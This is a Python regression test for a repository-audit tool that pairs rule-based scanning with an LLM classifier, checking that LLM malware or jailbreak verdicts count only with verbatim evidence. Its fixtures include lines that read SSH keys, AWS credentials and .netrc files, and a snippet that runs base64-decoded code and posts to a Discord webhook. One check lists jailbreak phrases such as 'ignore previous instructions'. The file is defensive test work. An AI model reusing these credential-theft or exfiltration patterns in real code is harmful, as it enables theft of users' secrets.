#!/usr/bin/env python3
"""LLM discipline: rules first, LLM only for unclear files, and a LLM verdict only counts with evidence.
Regression for the 'honest wrapper flagged as jailbreak by a small LLM' case. No network (fake backend)."""
import json, os, re, sys
HERE = os.path.dirname(os.path.abspath(__file__)); sys.path.insert(0, os.path.join(HERE, "..")); sys.path.insert(0, HERE)
import analyzer_core as ac, forge_audit, selftest as st  # noqa

R = []
def check(n, c, d=""):
    R.append(bool(c)); print(("PASS  " if c else "FAIL  ") + n + ("" if c else f"   -> {d}"))
def tag(v): return v.split("]")[0].lstrip("[")

class Fake:
    """backend.run(jobs) -> one answer per job; responder(system, user) -> JSON string"""
    def __init__(self, responder): self.responder, self.jobs = responder, []
    def run(self, jobs):
        self.jobs += jobs
        return [self.responder(s, u) for s, u in jobs]

def reply(cls, conf=100, ind=(), why="x"):
    return json.dumps({"classification": cls, "confidence": conf, "reasoning": why, "key_indicators": list(ind)})

def assess(files, backend, mode="smart", max_llm=10):
    f = {p: (c if isinstance(c, bytes) else c.encode()) for p, c in files.items()}
    return forge_audit.ForgeAnalyzer()._assess(
        provider="github", mode="archive", repo_info="t/t@main", blobs=[{"path": p, "size": len(b)} for p, b in f.items()],
        fetch=lambda p: (f.get(p), ""), members={}, notes=[], T={}, t_all=0, say=lambda m: None, tree_truncated=False,
        max_files=100, backend=backend, llm_max_files=max_llm, llm_mode=mode, system_prompt=None, user_template=None,
        check_osv=False, check_deps=False, artifact_max=0, abuse_key=None)

SSH1 = "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()"
MED = "import os\n" + SSH1 + "\nprint(len(key))\n"                                   # risk 10: one MEDIUM hit
MED3 = "import os\n" + "\n".join([SSH1, "c = open('/home/u/.aws/credentials').read()", "n = open('/home/u/.netrc').read()"]) + "\n"  # risk 30
HONEST = {**st.REPOS["honest"], "app/shellmaster.py": MED}
OBF = "x = '" + "aB3xQ9" * 45 + "'\nprint(len(x))\n"
echo = reply("JAILBREAK_WRAPPER", 100, ["unfiltered", "no ethical guidelines"], "contains unfiltered, no ethical guidelines")

# ---------------------------------------------------------------- the reported case
base = assess(HONEST, None)
check("rules alone: honest wrapper with one ssh-path line stays OK (baseline)", tag(base["verdict"]) == "OK", base["verdict"])
b = Fake(lambda s, u: echo)
r = assess(HONEST, b)
check("LLM says JAILBREAK_WRAPPER 100% everywhere -> verdict UNCHANGED (rules cannot see a jailbreak, LLM cannot see it either)",
      r["verdict"] == base["verdict"] and tag(r["verdict"]) == "OK", r["verdict"])
check("...and the unfounded LLM result is reported but not 'confirmed'", all(not x["result"].get("confirmed") for x in r["llm_results"]) and r["llm_results"], r["llm_results"][:1])
tg = {**HONEST, "README.md": "This is a thin wrapper around the OpenAI API.\nJoin https://t.me/hubsales for our private fine-tuned model, offer for sale, DM me.\n"}
r2 = assess(tg, Fake(lambda s, u: echo))
check("same + Telegram/sales README: a LLM jailbreak guess can no longer create a '[FAKE] SCAM FUNNEL'", "SCAM FUNNEL" not in r2["verdict"] and tag(r2["verdict"]) != "CRITICAL", r2["verdict"])
hx = assess(st.REPOS["hexsec"], Fake(lambda s, u: reply("BENIGN", 100)), mode="all")
check("real scam funnel (jailbreak found by RULES) stays FAKE even if the LLM says BENIGN (LLM never de-escalates)", tag(hx["verdict"]) == "FAKE", hx["verdict"])

# ---------------------------------------------------------------- malware verdicts need evidence
r = assess(HONEST, Fake(lambda s, u: reply("MALWARE_STEALER", 95, ["steals credentials", "sends them out"])))
check("MALWARE 95% with descriptive (non-quoted) evidence is NOT confirmed and not CRITICAL", tag(r["verdict"]) != "CRITICAL"
      and not any(x["result"]["confirmed"] for x in r["llm_results"]), r["verdict"])
r = assess(HONEST, Fake(lambda s, u: reply("MALWARE_STEALER", 95, [SSH1])))
x = r["llm_results"][0]["result"]
check("MALWARE 95% with a verbatim quote + rule hit: confirmed, but ONE medium rule hit (risk 10) is only a WARNING",
      x["confirmed"] and x["rule_risk"] == 10 and tag(r["verdict"]) == "WARNING", (x, r["verdict"]))
r = assess({**HONEST, "app/shellmaster.py": MED3}, Fake(lambda s, u: reply("MALWARE_STEALER", 95, ["open('/home/u/.netrc').read()"])))
check("verbatim quote + file risk >= 25 (three credential-path hits): confirmed -> CRITICAL", tag(r["verdict"]) == "CRITICAL"
      and r["llm_results"][0]["result"]["confirmed"], (r["verdict"], r["llm_results"][0]["result"]))
r = assess({**HONEST, "app/shellmaster.py": MED3}, Fake(lambda s, u: reply("MALWARE_STEALER", 95, ["line 12: open('/home/u/.netrc').read()".replace("line 12: ", "12: ")])))
check("quote with the excerpt's line-number prefix still verifies", r["llm_results"][0]["result"]["confirmed"], r["llm_results"][0]["result"])
r = assess({**HONEST, "app/shellmaster.py": MED3}, Fake(lambda s, u: reply("MALWARE_STEALER", 95, ["a quote that is not in the file at all"])))
check("invented quote -> not confirmed, no CRITICAL", tag(r["verdict"]) != "CRITICAL", r["verdict"])
r = assess({**HONEST, "app/obf.py": OBF}, Fake(lambda s, u: reply("MALWARE_STEALER", 95, ["aB3xQ9aB3xQ9aB3xQ9"]) if "obf.py" in u else reply("BENIGN")))
check("obfuscated file WITHOUT rule hits: LLM can reach WARNING (manual review) but not CRITICAL", tag(r["verdict"]) == "WARNING" and "CRITICAL" not in r["verdict"], r["verdict"])

# ---------------------------------------------------------------- smart gating
files = {"README.md": "wrapper\n", "app/clean.py": "def f():\n    return 1\n", "app/wrap.py": "import openai\nopenai.OpenAI().chat.completions.create(model='m')\n",
         "app/medium.py": MED, "app/obf.py": OBF}
b = Fake(lambda s, u: reply("BENIGN", 90))
r = assess(files, b)
sent = sorted(re.search(r"File: (\S+)", u).group(1) for _, u in b.jobs)
check("smart: only the medium-risk and the obfuscated file are sent (clean + wrapper-only are not)", sent == ["app/medium.py", "app/obf.py"], sent)
check("smart: llm_gate reports what happened", r["llm_gate"]["mode"] == "smart" and r["llm_gate"]["sent"] == 2 and r["llm_gate"]["clean"] >= 2, r["llm_gate"])
b = Fake(lambda s, u: reply("BENIGN", 90))
assess(files, b, mode="all")
sent_all = sorted(re.search(r"File: (\S+)", u).group(1) for _, u in b.jobs)
check("all mode: wrapper-only file is sent too (old behaviour, more tokens)", "app/wrap.py" in sent_all and len(sent_all) > 2, sent_all)
strong = {**files, "app/bad.py": "import base64\nexec(base64.b64decode('QUJD'))\nimport requests\nrequests.post('https://discord.com/api/webhooks/1/abc', data=1)\n" * 2}
b = Fake(lambda s, u: reply("BENIGN", 90))
r = assess(strong, b)
check("rules already CRITICAL -> LLM is not called at all", not b.jobs and tag(r["verdict"]) == "CRITICAL" and "not needed" in r["llm_gate"]["skipped_reason"], (len(b.jobs), r["verdict"], r["llm_gate"]))
b = Fake(lambda s, u: reply("BENIGN", 90))
r = assess(files, b, max_llm=1)
check("max files limit still applies", len(b.jobs) == 1, len(b.jobs))

# ---------------------------------------------------------------- prompt + helpers
sp = ac.DEFAULT_SYSTEM_PROMPT.lower()
check("prompt no longer contains the example phrases a small model echoes back", not any(x in sp for x in ("unfiltered", "no ethical guidelines", "ignore previous instructions")), "phrase still in prompt")
check("prompt has a BENIGN default class and demands verbatim quotes", "benign" in sp and "verbatim" in sp and "BENIGN" in ac._FIXED_SUFFIX and "VERBATIM" in ac._FIXED_SUFFIX)
check("prompt does not prime for scams", "may be a scam" not in sp and "scam" not in sp.split("classes:")[0])
check("prompt says withheld lines are not visible", "withheld" in sp)
j = ac.build_job("a.py", "x = 1\n" + "y = '" + "z" * 900 + "'\n" + "\n".join(f"l{i} = {i}" for i in range(3000)), [], ac.DEFAULT_SYSTEM_PROMPT, ac.DEFAULT_USER_TEMPLATE, compact=True)
check("compact excerpt: <= 5000 chars of code and long lines are cut with a [+N chars] marker", len(j[1]) < 5600 and "[+" in j[1] and "chars]" in j[1], len(j[1]))
check("obfuscation flags: long line / long token / many \\x escapes", ac.obfuscation_flags("a" * 2000) and ac.obfuscation_flags("x='" + "A1" * 150 + "'") and ac.obfuscation_flags("\\x41" * 60), "")
check("obfuscation flags: .min.js and node_modules are exempt", not ac.obfuscation_flags("a" * 5000, "dist/app.min.js") and not ac.obfuscation_flags("a" * 5000, "node_modules/x/y.js"))
check("validate: unknown class falls back to UNCLEAR, BENIGN is valid", ac.validate_llm_result({"classification": "BENIGN", "confidence": 5})["classification"] == "BENIGN"
      and ac.validate_llm_result({"classification": "EVIL"})["classification"] == "UNCLEAR")
print(f"\n{sum(R)}/{len(R)} Pruefungen bestanden"); sys.exit(0 if all(R) else 1)
